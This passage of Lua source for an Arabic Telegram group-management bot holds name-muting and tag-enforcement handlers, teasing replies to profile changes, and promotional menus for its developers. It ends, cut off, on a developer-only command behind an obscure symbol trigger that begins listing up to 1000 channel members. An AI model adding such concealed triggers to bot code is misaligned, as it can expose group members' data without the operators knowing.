if text == "تفعيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, ' ♤ تم التفعيل الاسماء المكتومه')
database:set(bot_id.."block:name:stats"..msg.chat_id_,"open")
end
if text == "تعطيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, ' ♤ تم تعطيل الاسماء المكتومه')
database:set(bot_id.."block:name:stats"..msg.chat_id_,"close")
end
if not Manager(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
function S00F4_name(t1,t2)
if t2.id_ then 
name_MRSOFI = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_MRSOFI then 
names_MRSOFI = database:smembers(bot_id.."DRAGON:blocname"..msg.chat_id_) or ""
if names_MRSOFI and names_MRSOFI[1] then 
for i=1,#names_MRSOFI do 
if name_MRSOFI:match("(.*)("..names_MRSOFI[i]..")(.*)") then 
DeleteMessage_(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
end
end
end
bnnaGet(msg.sender_user_id_, S00F4_name)
end
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open" then
if text and text:match("^وضع توحيد (.*)$") and Manager(msg) and database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open" then
local teh = text:match("^وضع توحيد (.*)$")
send(msg.chat_id_, msg.id_,' ♤ تم تعيين '..teh..' كتوحيد للمجموعه')
database:set(bot_id.."DRAGON:teh"..msg.chat_id_,teh)
end
if text and text:match("^تعين عدد الكتم (.*)$") and Manager(msg) and database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open" then
local nump = text:match("^تعين عدد الكتم (.*)$")
send(msg.chat_id_, msg.id_,' ♤ تم تعين  '..nump..' عدد الكتم')
database:set(bot_id.."DRAGON:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."DRAGON:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."DRAGON:nump"..msg.chat_id_) or 5
send(msg.chat_id_, msg.id_,' ♤ التوحيد '..s1..'\n ♤ عدد الكتم  : '..s2)
end
end
if text == "تفعيل التوحيد" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, ' ♤ تم تفعيل التوحيد')
database:set(bot_id.."kt:twh:stats"..msg.chat_id_,"open")
end
if text == "تعطيل التوحيد" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, ' ♤ تم تعطيل التوحيد')
database:set(bot_id.."kt:twh:stats"..msg.chat_id_,"close")
end
if not Constructor(msg) then
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."DRAGON:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function sofi_mrsofi_new(mrsofi1,mrsofi2)
if mrsofi2 and mrsofi2.first_name_ then 
if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."DRAGON:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."DRAGON:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrsofi_nnn = database:get(bot_id.."DRAGON:nump"..msg.chat_id_) or 5
local mrsofi_nnn2 = database:get(bot_id.."DRAGON:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrsofi_nnn2) == tonumber(mrsofi_nnn) or tonumber(mrsofi_nnn2) > tonumber(mrsofi_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."DRAGON:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, " ♤ عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "eLmLoK0")..")\n ♤ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."DRAGON:teh"..msg.chat_id_).."} بجانب اسمك\n ♤ عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
bnnaGet(id, sofi_mrsofi_new)
end
end
if text == "تفعيل تنبيه الاسماء" and Manager(msg) and database:get(bot_id.."AL:Sre:stats") == "✔" then
send(msg.chat_id_, msg.id_, '•تم تفعيل تنبيه الاسماء')
database:set(bot_id.."Ttn:BBE:stats"..msg.chat_id_,"open")
end
if text == "تعطيل تنبيه الاسماء" and Manager(msg) and database:get(bot_id.."AL:Sre:stats") == "✔" then
send(msg.chat_id_, msg.id_, '•تم تعطيل تنبيه الاسماء')
database:set(bot_id.."Ttn:BBE:stats"..msg.chat_id_,"close")
end
if text and database:get(bot_id.."Ttn:BBE:stats"..msg.chat_id_) == "open" then 
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
if data.id_ then 
if data.id_ ~= bot_id then
local DRAGONChengName = database:get(bot_id.."DRAGON:Cheng:Name"..data.id_)
if not data.first_name_ then 
if DRAGONChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..DRAGONChengName..']')
database:del(bot_id.."DRAGON:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if DRAGONChengName ~= data.first_name_ then 
local Text = {
  "جان اسمك خوش اسم ",
"ليش غيرت اسمك يحلو ",
"هذا لحلو غير اسمه ",
}
send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
end  
database:set(bot_id.."DRAGON:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
end
if text == "تفعيل تنبيه المعرف" and Constructor(msg) and database:get(bot_id.."AL:Sre:stats") == "✔" then
send(msg.chat_id_, msg.id_, '•تم تفعيل تنبيه المعرف')
database:set(bot_id.."Ttn:Userr:stats"..msg.chat_id_,"open")
end
if text == "تعطيل تنبيه المعرف" and Constructor(msg) and database:get(bot_id.."AL:Sre:stats") == "✔" then
send(msg.chat_id_, msg.id_, '•تم تعطيل تنبيه المعرف')
database:set(bot_id.."Ttn:Userr:stats"..msg.chat_id_,"close")
end
if text and database:get(bot_id.."Ttn:Userr:stats"..msg.chat_id_) == "open" then  
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
if data.id_ then 
if data.id_ ~= bot_id then
local DRAGONChengUserName = database:get(bot_id.."DRAGON:Cheng:UserName"..data.id_)
if not data.username_ then 
if DRAGONChengUserName then 
send(msg.chat_id_, msg.id_, 1, "مسح معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..DRAGONChengUserName..']')
database:del(bot_id.."DRAGON:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if DRAGONChengUserName ~= data.username_ then 
local Text = {
'شكو غيرت معرفك شنو نشروك بقنوات نحراف 🌞😹😹😹',
"هاها شو غيرت معرفك بس لا هددوك 🤞😂😂",
"شسالفه شو غيرت معرفك 😐🕊",
"غير معرفه خمطو بساع بساع \n هاذه معرفه : @"..data.username_.."",
'ها عار مو جان معرفك \n شكو غيرته ل @'..data.username_..' ',
'ها يول شو مغير معرفك', 
"منور معرف جديد : "..data.username_.."",
}
send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
end  
database:set(bot_id.."DRAGON:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
end
if text == "تفعيل تنبيه الصور" and Manager(msg) and database:get(bot_id.."AL:Sre:stats") == "✔" then
send(msg.chat_id_, msg.id_, '•تم تفعيل تنبيه الصور')
database:set(bot_id.."Ttn:Ph:stats"..msg.chat_id_,"open")
end
if text == "تعطيل تنبيه الصور" and Manager(msg) and database:get(bot_id.."AL:Sre:stats") == "✔" then
send(msg.chat_id_, msg.id_, '•تم تعطيل تنبيه الصور')
database:set(bot_id.."Ttn:Ph:stats"..msg.chat_id_,"close")
end
if text and database:get(bot_id.."Ttn:Ph:stats"..msg.chat_id_) == "open" then  
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
if data.id_ then 
if data.id_ ~= bot_id then 
local DRAGONChengPhoto = database:get(bot_id.."DRAGON:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if DRAGONChengPhoto then 
send(msg.chat_id_, msg.id_, "مسح كل صوره الحلو 😂👌🏻")
database:del(bot_id.."DRAGON:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if DRAGONChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
  "شكو غيرت صورتك  يا حلو ",
  "منور طالع حلو عل صوره جديده",
  "ها شو غيرت صورتك 🤔😹",
  "شكو غيرت صورتك شنو قطيت وحده جديده 😹😹♤",
  "شو غيرت صورتك شنو تعاركت ويه الحب ●😹🌞",
  "شكو غيرت الصوره شسالفه ●● 🤔🌞",
}
send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
end  
database:set(bot_id.."DRAGON:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)   
end
if text == 'التحديث ' or text == 'تحديث السورس' or text == 'تحديث' and not database:get(bot_id..'Namebot'..msg.chat_id_) then     
tdcli_function ({ID = "GetUser",user_id_ = bot_id, offset_},function(extra,result,success)
local msg_id = msg.id_/2097152/0.5  
local textt = "eLmLoK0"..(database:get(bot_id..'Name:Bot') or 'الملوك')
local DRAGON = 'https://t.me/timo_019/39'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'تحديث السورس', callback_data="/rsayly"},{text = 'تحديث الملفات', callback_data="/s7katy"},
},
{
{text = 'تحديث الملفات', callback_data="/s7katy"},
},
}
local function getpro(extra, result, success) 
if result.photos_[0] then 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&photo=' .. URL.escape(textt).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=' .. URL.escape(DRAGON).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end end 
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = bot_id, offset_, offset_ = 0, limit_ = 1 }, getpro, nil) 
end,nil)
end
if text == 'ردود' or text == 'تفعيل ردود السورس' or text == 'تعطيل ردود السورس' and not database:get(bot_id..'Namebot'..msg.chat_id_) then     
tdcli_function ({ID = "GetUser",user_id_ = bot_id, offset_},function(extra,result,success)
local msg_id = msg.id_/2097152/0.5  
local textt = "eLmLoK0"..(database:get(bot_id..'Name:Bot') or 'صعيدي')
local DRAGON = 'https://t.me/timo_019/39'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'تفعيل ردود السورس ', callback_data="/Replies"},{text = 'تعطيل ردود السورس ', callback_data="/Replies2"},
},
{
{text = '°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌°', url="t.me/eLmLoK0"},
},
}
local function getpro(extra, result, success) 
if result.photos_[0] then 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&photo=' .. URL.escape(textt).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=' .. URL.escape(DRAGON).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end end 
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = bot_id, offset_, offset_ = 0, limit_ = 1 }, getpro, nil) 
end,nil)
end

if text == 'SOURCE' or text == 'سورس' or text == 'السورس' or text == 'source' or text == 'يا سورس' or text == 'سورسي' then 
local Text = [[
┏━-━━━━━━-━━━━━━━-━┓
               [𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌](http://t.me/eLmLoK0)
┗━-━━━━━━-━━━━━━━-━┛
  ┏━━━━━━━━━━━━━━━┓
    [𝒕𝒉𝒆 𝒃𝒆𝒔𝒕 𝒔𝒐𝒖𝒓𝒄𝒆 𝒐𝒏 𝒕𝒆𝒍𝒆𝒈𝒓𝒂𝒎](http://t.me/eLmLoK0)    
  ┗━━━━━━━━━━━━━━━┛
┏━-━━━━━━-━━━━━━━-━┓
               [𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌](http://t.me/eLmLoK0)
┗━-━━━━━━-━━━━━━━-━┛
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒎𝒚 𝒅𝒆𝒗 ', callback_data="/units"},{text = '𝒎𝒚 𝒄𝒉𝒂𝒏𝒏𝒆𝒍 ', callback_data="/theytry"}},  
{{text = '°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌° ',url="https://t.me/eLmLoK0"}}, 
{{text = 'أضفہ ألبہوتہ أليہ مہجہمہوعہتہكہ°' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/timo_019/40&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'مين نصبلك' or text == 'عايزه بوت' or text == 'عايز بوت' then
local Text = [[
┏━-━━━━━━-━━━━━━━-━┓
                [𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌](http://t.me/eLmLoK0)
┗━-━━━━━━-━━━━━━━-━┛
  ┏━━━━━━━━━━━━━━━┓
    [𝒕𝒉𝒆 𝒃𝒆𝒔𝒕 𝒔𝒐𝒖𝒓𝒄𝒆 𝒐𝒏 𝒕𝒆𝒍𝒆𝒈𝒓𝒂𝒎](http://t.me/eLmLoK0)    
  ┗━━━━━━━━━━━━━━━┛
┏━-━━━━━━-━━━━━━━-━┓
                [𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌](http://t.me/eLmLoK0)
┗━-━━━━━━-━━━━━━━-━┛
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒕𝒊𝒎𝒐  ',url="t.me/ttimo_8lby"},{text = '𝒂𝒃𝒐 𝒆𝒍𝒎𝒂𝒈𝒅',url="t.me/ABO_ELMAGD2"}},
{{text = '𝒐𝒎𝒂𝒓  ',url="t.me/teemElmelok"},{text = '𝒎𝒐𝒔𝒕𝒂𝒇𝒂 ',url="t.me/J_A_B_W_A"}},
{{text = '°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌° ', url="t.me/eLmLoK0"}},
{{text = 'أضفہ ألبہوتہ أليہ مہجہمہوعہتہكہ°' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/timo_019/40&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'تيمو' or text == 'مبرمج تيمو' or text == 'مبرمج السورس' or text == 'TIMO' then 
local msg_id = msg.id_/2097152/0.5  
local Text = [[ 
 ♤ المبرمج تيمو للتواصل معاه اتبع الزر ال في الاسفل ⇓⇑
   ]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝒕𝒊𝒎𝒐',url="t.me/ttimo_8lby"}},
{{text = '𝒈𝒓𝒐𝒖𝒑',url="t.me/e_L_m_L_o_K"},{text = '𝒄𝒉𝒂𝒏𝒏𝒆𝒍 ',url="t.me/eLmLoK0"}},
{{text = '𝒃𝒐𝒕 𝒕𝒊𝒎𝒐',url="t.me/Timo8Bot"}}, 
} 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/ttimo_8lby&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'ابو المجد' or text == 'مبرمج ابو المجد' or text == 'المبرمج' or text == 'ABOELMAGD' then 
local msg_id = msg.id_/2097152/0.5  
local Text = [[ 
المبرمج ابو المجد للتوصل معاه اتبع الزر ال في الاسفل ⇓⇑
   ]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝒂𝒃𝒐 𝒆𝒍𝒎𝒂𝒈𝒅',url="t.me/ABO_ELMAGD2"}}, 
{{text = '𝒈𝒓𝒐𝒖𝒑',url="t.me/omar_moot"},{text = '𝒄𝒉𝒂𝒏𝒏𝒆𝒍 ',url="t.me/OMARmoot"}},
{{text = '𝒃𝒐𝒕 𝒂𝒃𝒐 𝒆𝒍𝒎𝒂𝒈𝒅',url="t.me/Elmalek1bot"}},
} 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/timo_019/37&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'عمر' or text == 'مالك عمر' or text == 'مالك السورس' or text == 'OMAR' then 
local msg_id = msg.id_/2097152/0.5  
local Text = [[ 
مالك السورس عمر للتواصل معاه اتبع الزر ال في الاسفل ⇓⇑
   ]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝒐𝒎𝒂𝒓',url="t.me/teemElmelok"}}, 
{{text = '𝒈𝒓𝒐𝒖𝒑',url="t.me/omar_moot"},{text = '𝒄𝒉𝒂𝒏𝒏𝒆𝒍 ',url="t.me/OMARmoot"}},
{{text = '𝒃𝒐𝒕 𝒐𝒎𝒂𝒓',url="t.me/omarteembot"}}, 
} 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/teemElmelok&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'جابوا' or text == 'مبرمج جابوا' or text == 'الملك جابوا' or text == 'مطور السورس' then 
local msg_id = msg.id_/2097152/0.5  
local Text = [[ 
المبرمج جابوا للتوصل معاه اتبع الزر ال في الاسفل ⇓⇑
   ]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝒎𝒐𝒔𝒕𝒂𝒇𝒂',url="t.me/J_A_B_W_A"}}, 
{{text = '𝒈𝒓𝒐𝒖𝒑',url="t.me/BAR_JABWA"},{text = '𝒄𝒉𝒂𝒏𝒏𝒆𝒍 ',url="t.me/S_a_i_d_i"}},
{{text = '𝒃𝒐𝒕 𝒎𝒐𝒔𝒕𝒂𝒇𝒂',url="t.me/Bot_JABWA_Bot"}}, 
} 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/J_A_B_W_A&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'سوال وجواب' or text == 'سوال' or text == 'جواب' or text == 'اسئله' and not database:get(bot_id..'Namebot'..msg.chat_id_) then     
tdcli_function ({ID = "GetUser",user_id_ = bot_id, offset_},function(extra,result,success)
local msg_id = msg.id_/2097152/0.5  
local textt = "eLmLoK0"..(database:get(bot_id..'Name:Bot') or 'الملوك')
local tessttmos = " اسم بوت ⤌ "..(database:get(bot_id..'Name:Bot') or "..Namebot..") 
local Jabwa = 'https://t.me/timo_019/39'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '°ابدا الأسئلة°', callback_data="/BBB"},
},
{
{text = tessttmos, url = "http://t.me/"..sudos.UserName},
},
}
local function getpro(extra, result, success) 
if result.photos_[0] then 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&photo=' .. URL.escape(textt).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=' .. URL.escape(Jabwa).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end end 
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = bot_id, offset_, offset_ = 0, limit_ = 1 }, getpro, nil) 
end,nil)
end

if text == 'تحكم' or text == 'تحكم رتبه' or text == 'التحكم' or text == 'رتبه' and not database:get(bot_id..'Namebot'..msg.chat_id_) then     
function start_function(extra, result, success)
local keyboard = {
{{text ='حظر',callback_data=msg.sender_user_id_.."been"..result.sender_user_id_},{text ='الغاء حظر',callback_data=msg.sender_user_id_.."unbeen"..result.sender_user_id_}},
{{text ='كتم',callback_data=msg.sender_user_id_.."Mut"..result.sender_user_id_},{text ='الغاء كتم',callback_data=msg.sender_user_id_.."unMut"..result.sender_user_id_}},
{{text ='تقييد',callback_data=msg.sender_user_id_.."restrict"..result.sender_user_id_},{text ='الغاء تقييد',callback_data=msg.sender_user_id_.."unrestrict"..result.sender_user_id_}},
{{text ='رفع رتبه',callback_data=msg.sender_user_id_.."UpS"..result.sender_user_id_},{text ='تنزيل رتبه',callback_data=msg.sender_user_id_.."unUpS"..result.sender_user_id_}},
{{text = '°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌°', url="t.me/eLmLoK0"}},
}
local msg_id = msg.id_/2097152/0.5
send_inline_key(msg.chat_id_,"*♤ مرحبـا بـــك فــي قائمــه التحكــم اضغــط علــي الامــر فــي الاسفــل ⇓⇑*",nil,keyboard,msg_id)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text == 'الملوك' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,' هذا الامر لا يخصك')
return false
end
local Text =[[
❤️🕊اضغط علي الزر لاختيار الشئ الذي تريدو ⇓⇑
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '°غنيلي°', callback_data="/mlp1"},{text = '°استوري°', callback_data="/mlp2"},
},
{
{text = '°ثيم°', callback_data="/mlp3"},{text = '°كتبات اخري°', callback_data="/mlp6"},
},
{
{text = '°تويت بالصوره°', callback_data="/mlp4"},{text = '°لو خيروك بالصوره°', callback_data="/mlp5"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end

if text == 'يوتيوب' or text == 'بحث' or text == 'اليوتيوب' then
local Text = [[
♤الـيـك بـوتـات تـحمـيـل مـن جـمـيـع الـمواقـع ⇓⇑
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒚𝒐𝒖𝒕𝒖𝒃𝒆',url="t.me/IT_ITBOT"},{text = '𝒕𝒊𝒌 𝒕𝒐𝒌',url="t.me/K0XBOT"}},
{{text = '⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺', url="https://t.me/eLmLoK0"}},
{{text = '𝒆𝒏𝒔𝒕𝒂',url="t.me/J9bbot"},{text = '𝒆𝒍𝒌𝒓𝒂𝒏',url="t.me/quran_lbot"}},
{{text = '⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺', url="https://t.me/eLmLoK0"}},
{{text = '°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌°', url="t.me/eLmLoK0"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/timo_019/20&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'عايز سورس' or text == 'عاوز سورس' or text == 'حد يعملي سورس' then
local Text = [[
♤ لو حابب تعمل سورس تواصل مع المبرمج تيمو ⇓⇑
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '♤ 𝒕𝒊𝒎𝒐',url="t.me/ttimo_8lby"}},
{{text = '♤ 𝒃𝒐𝒕 𝒕𝒊𝒎𝒐',url="t.me/Timo8Bot"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/ttimo_8lby&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'روايات' or text == 'الروايات' or text == 'ررويات' then
local Text = [[
[♤ W𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 °𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌°](http://t.me/eLmLoK0)
]]
keyboard = {} keyboard.inline_keyboard = {
{{text = ' مقبره الحيوانات', url="https://t.me/rwayatelmlok/7"}},
{{text = ' ارضل زيكولا',url="https://t.me/rwayatelmlok/2"},{text = ' موسوعه الظلام', url="https://t.me/rwayatelmlok/3"}},
{{text = 'الشفق', url="https://t.me/rwayatelmlok/12"},{text = ' المخلوق', url="https://t.me/rwayatelmlok/4"}},
{{text = 'بعد النسيان', url="https://t.me/rwayatelmlok/10"},{text = 'في حضن الجن', url="https://t.me/rwayatelmlok/5"}},
{{text = 'واختفي كل شئ', url="https://t.me/rwayatelmlok/21"},{text = ' في القطار السريع', url="https://t.me/rwayatelmlok/17"}},
{{text = 'نيلوفر اسود', url="https://t.me/rwayatelmlok/18"},{text = 'جثه في الفندق', url="https://t.me/rwayatelmlok/20"}},
{{text = 'جثه في الفندق', url="https://t.me/rwayatelmlok/20"},{text = ' في القطار السريع', url="https://t.me/rwayatelmlok/17"}},
{{text = 'لقاء مع كاتب رعب', url="https://t.me/rwayatelmlok/6"},{text = 'الانسان الاخير', url="https://t.me/rwayatelmlok/15"}},
{{text = '⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺', url="https://t.me/eLmLoK0"}},
{{text = '𝒕𝒊𝒎𝒐',url="t.me/ttimo_8lby"}},
{{text = '°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌°', url="t.me/eLmLoK0"}},
}
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/timo_019/16&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'مطورين السورس' or text == 'مبرمجين السورس' then
local Text = [[
♤ مطورين ومبرمجين السورس للتواصل معهم اتبع الازرار ال في الاسفل ⇓⇑
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒕𝒊𝒎𝒐  ',url="t.me/ttimo_8lby"},{text = '𝒂𝒃𝒐 𝒆𝒍𝒎𝒂𝒈𝒅',url="t.me/ABO_ELMAGD2"}},
{{text = '⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺', url="https://t.me/eLmLoK0"}},
{{text = '𝒐𝒎𝒂𝒓  ',url="t.me/teemElmelok"},{text = '𝒎𝒐𝒔𝒕𝒂𝒇𝒂 ',url="t.me/J_A_B_W_A"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/timo_019/40&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text=="اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ♤ ارسل الان اذاعتك● \n ♤ للخروج ارسل الغاء ")
return false
end
if text == "£¢€$$__€€¢¥^^¥€" and DevSoFi(msg) then
if AddChannel(msg.sender_user_id_) == false then

return false
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000
